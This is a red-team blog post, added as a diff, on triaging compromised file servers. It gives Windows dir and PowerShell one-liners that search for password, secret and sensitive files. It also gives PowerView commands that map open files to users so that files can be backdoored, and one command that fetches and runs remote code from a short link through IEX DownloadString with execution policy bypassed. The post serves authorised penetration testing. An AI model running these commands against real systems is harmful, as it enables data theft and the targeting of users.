@@ -1,0 +1,33 @@
+<p><strong>Note:</strong> this topic was cross-posted on the official <a href="http://www.verisgroup.com/2014/05/19/file-server-triage-on-red-team-engagements/">Veris Group blog</a></p>
+<p>One common activity performed during red team assessments is data pilfering of compromised servers, particularly file servers. These systems can host an incredible amount of useful information and often the target data you&#8217;re after. However, the triage of a machine with literally millions of files can be an incredibly time consuming process. Examining the innumerable number of files, folders, and shares is how some red teams break their new members over a span of days, weeks, and months. This post will cover a few techniques to hopefully help you find what you&#8217;re looking for when you happen to pop one of these boxes.</p>
+<p>The first technique is about as basic as it gets, straight recursive <strong>dir</strong> listings. You can then do key word searches on the results, checking for things like &#8220;*secret*&#8221;, &#8220;*sensitive*&#8221;, &#8220;*password*&#8221;, etc. For a basic recursive listing, you can use:</p>
+<ul>
+<li>C:\&gt;<strong> dir /s C:\ &gt; listing.txt</strong></li>
+</ul>
+<p>If you want those files sorted by subdirectory with the most recently accessed file on top, along with the owner for each file, you can use:</p>
+<ul>
+<li>C:\&gt; <strong>dir /S /Q /O:-D /T:A C:\ &gt; listing.txt </strong></li>
+</ul>
+<p>If the target machine has Powershell installed, you can go a bit further and customize the listing behavior to get exactly what you want. Using <strong>Get-Childitem</strong> and a bit of manipulation, we can get a CSV file with the paths of all files, their owners, creation/access times and size. This file can then be sorted by LastAccessTime to see what files have recently been touched. Change into the directory/share you want to list and run:</p>
+<ul>
+<li>C:\&gt; <strong>powershell.exe -command &#8220;get-childitem .\ -rec -ErrorAction SilentlyContinue | where {!$_.PSIsContainer} | select-object FullName, @{Name=&#8217;Owner&#8217;;Expression={(Get-Acl $_.FullName).Owner}}, LastAccessTime, LastWriteTime, Length | export-csv -notypeinformation -path files.csv&#8221;</strong></li>
+</ul>
+<p>Quick word of warning though: these recursive directory listing files can get extremely large for certain systems- on a recent engagement we ended up generating gigabytes of directory listings from just a handful of file servers. If you want to pare down the size of the results, you can output only files with certain extensions by using the <strong>-include</strong> flag:</p>
+<ul>
+<li>C:\&gt; <strong>powershell.exe -command &#8220;get-childitem .\ -rec -ErrorAction SilentlyContinue -include @(&#8216;*.doc*&#8217;,&#8217;*.xls*&#8217;,&#8217;*.pdf&#8217;)|where{!$_.PSIsContainer}|select-object FullName,@{Name=&#8217;Owner&#8217;;Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv&#8221;</strong></li>
+</ul>
+<p>Or if you wanted to do several wildcard searches for sensitive files (replace the terms as necessary):</p>
+<ul>
+<li>C:\&gt; <strong>powershell.exe -command &#8220;get-childitem .\ -rec -ErrorAction SilentlyContinue -include @(&#8216;*password*&#8217;,&#8217;*sensitive*&#8217;,&#8217;*secret*&#8217;)|where{!$_.PSIsContainer}|select-object FullName,@{Name=&#8217;Owner&#8217;;Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv&#8221;</strong></li>
+</ul>
+<p>If you happen to have administrative privileges on the machine you&#8217;re triaging, and remote users are accessing files on the box, you can utilize the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb525378(v=vs.85).aspx">NetFileEnum</a> Windows API call to get information on what files each user is accessing. This information can then be combined with information from <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb525382(v=vs.85).aspx">NetSessionEnum</a> (aka &#8220;net sessions&#8221;) to extract where that user is logged in from. Luckily, <a href="https://www.veil-framework.com/veil-powerview/">Veil-Powerview</a> has you covered on that front, and we can chain together <strong>Get-NetFiles</strong> and <strong>Get-NetSessions</strong> to get complete output with the following one-liner:</p>
+<ul>
+<li>C:&gt; <strong>powershell.exe -exec bypass -Command &#8220;&amp; {Import-Module .\powerview.ps1; $sess=@{};Get-Netsessions|foreach{$sess[$_.sesi10_username]=$_.sesi10_cname};Get-NetFiles | Select-Object @{Name=&#8217;Username&#8217;;Expression={$_.fi3_username}},@{Name=&#8217;Filepath&#8217;;Expression={$_.fi3_pathname}},@{Name=&#8217;Computer&#8217;;Expression={$sess[$_.fi3_username]}}|export-csv -notypeinformation -path open_files.csv}&#8221;</strong></li>
+</ul>
+<p>You should get a sortable CSV file with open files, usernames and associated login locations. This can give you information on what data might be valuable, as well as choosing files you might want to backdoor in order to target specific users. If you want to achieve the same result without touching disk (by downloading PowerView directly from GitHub) you can do that too:</p>
+<ul>
+<li>C:&gt; <strong>powershell -nop -exec bypass -c &#8220;IEX (New-Object Net.WebClient).DownloadString(&#8216;http://bit.ly/1mYPUO4&#8242;); $sess=@{};Get-Netsessions|foreach{$sess[$_.sesi10_username]=$_.sesi10_cname};Get-NetFiles | Select-Object @{Name=&#8217;Username&#8217;;Expression={$_.fi3_username}},@{Name=&#8217;Filepath&#8217;;Expression={$_.fi3_pathname}},@{Name=&#8217;Computer&#8217;;Expression={$sess[$_.fi3_username]}}&#8221;</strong></li>
+</ul>
+<p>Happy searching, and come check out the new Powershell security channel started by  <a href="https://twitter.com/ben0xa">Ben0xA</a> on Freenode, #pssec.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
